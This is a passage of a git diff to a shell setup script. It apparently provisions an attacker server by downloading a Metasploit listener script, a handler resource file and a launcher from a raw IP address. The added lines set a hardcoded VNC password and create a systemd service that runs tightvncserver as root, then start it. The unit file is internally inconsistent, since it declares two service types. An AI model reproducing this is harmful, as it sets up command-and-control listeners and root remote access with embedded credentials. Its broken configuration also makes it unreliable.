@@ -18,3 +18,18 @@ wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/linuxMetListener.sh -O /la
 chmod +x linuxMetListener.sh
 wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/handler.rc -O /root/handler.rc
 wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/launcher.sh -O /root/launcher.sh
+printf "dh?w2qa3\ndh?w2qa3\n\n" | vncpasswd -f
+echo '[Unit]' > /etc/systemd/system/tightvncserver.service
+echo 'Description=TightVNC remote desktop server' >> /etc/systemd/system/tightvncserver.service
+echo -e '\n' >> /etc/systemd/system/tightvncserver.service
+echo '[Service]' >> /etc/systemd/system/tightvncserver.service
+echo 'Type=dbus' >>  /etc/systemd/system/tightvncserver.service
+echo 'ExecStart=/usr/bin/tightvncserver :1' >>  /etc/systemd/system/tightvncserver.service
+echo 'User=root' >> /etc/systemd/system/tightvncserver.service
+echo 'Type=forking' >> /etc/systemd/system/tightvncserver.service
+echo -e '\n' >> /etc/systemd/system/tightvncserver.service
+echo '[Install]' >>  /etc/systemd/system/tightvncserver.service
+echo 'WantedBy=multi-user.target' >>  /etc/systemd/system/tightvncserver.service
+chown root:root /etc/systemd/system/tightvncserver.service
+chmod 755 /etc/systemd/system/tightvncserver.service
+systemctl start tightvncserver.service
